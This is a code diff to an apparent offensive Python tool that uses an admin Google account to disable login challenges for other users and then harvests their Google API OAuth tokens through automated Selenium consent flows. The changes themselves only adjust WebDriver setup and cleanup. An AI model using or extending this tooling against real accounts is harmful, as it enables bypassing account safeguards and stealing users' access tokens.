@@ -119,6 +119,7 @@ class ServerThread(Thread):
         self.srv.shutdown()
 
 def cleanup(this_driver):
+    global logged_in
     print("[!] Cleanup started for %s" % hex(id(this_driver)))
     # check if this_driver exist
     if this_driver:
@@ -126,6 +127,7 @@ def cleanup(this_driver):
         this_driver.delete_all_cookies()
         # close the session
         this_driver.quit()
+    logged_in = False
 
 def user_consent_flow(target_user, authorization_url):
     global driver
@@ -324,14 +326,14 @@ if __name__ == "__main__":
         sys.exit(1)
     # separates the USER_ID from the email
     admin_user, admin_user_id = separate_google_id_from(admin_user)
-    # created a dedicated WebDriver for Admin User
-    admin_driver = getwebdriver()
     # Create a Server Thread using Flask API to catch the OAuth2 Callback
     server = ServerThread(app)
     # start the ServerThread
     server.start()
     # Loop through each user in users
     for user in users:
+        # created a dedicated WebDriver for Admin User
+        admin_driver = getwebdriver()
         # separates the USER_ID from the email
         user, user_id = separate_google_id_from(user)
         # check it the current user is not an admin type user
@@ -340,7 +342,7 @@ if __name__ == "__main__":
             disable_login_challenge(admin_user, user_id)
         # harvesting google apis token using OAuth2 scenario
         harvest_googleapis_token(user)
-    # cleanup all cookies and close admin_driver session
-    cleanup(admin_driver)
+        # cleanup all cookies and close admin_driver session
+        cleanup(admin_driver)
     # shutdown the server thread
     server.shutdown()
